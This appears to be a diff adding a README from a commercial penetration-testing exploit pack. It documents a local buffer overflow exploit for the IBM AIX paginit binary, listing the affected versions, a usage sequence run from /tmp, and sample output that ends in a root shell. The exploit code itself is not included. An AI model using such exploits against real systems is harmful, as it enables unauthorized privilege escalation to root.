@@ -1,0 +1,38 @@
+D2 Exploitation Pack
+====================
+
+Copyright (c) 2007-2009 DSquare Security, LLC
+
+
+License information
+-------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Local exploit
+---------------
+
+IBM AIX PAGINIT Local Buffer Overflow Vulnerability
+
+Vulnerable:  	 
+	IBM AIX 5.3 L
+	IBM AIX 5.2.2
+	IBM AIX 5.2 L
+	IBM AIX 5.3
+	IBM AIX 5.2
+
+Tested on :
+	IBM AIX 5.2
+
+Ref:
+	http://www.securityfocus.com/bid/12043
+
+Usage:
+$ mv d2sec_paginit /tmp/d2
+bash-3.2$ /tmp/d2
+AA/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/ò \/
+# id
+uid=0(root) gid=0(system) groups=1(staff)
+# 
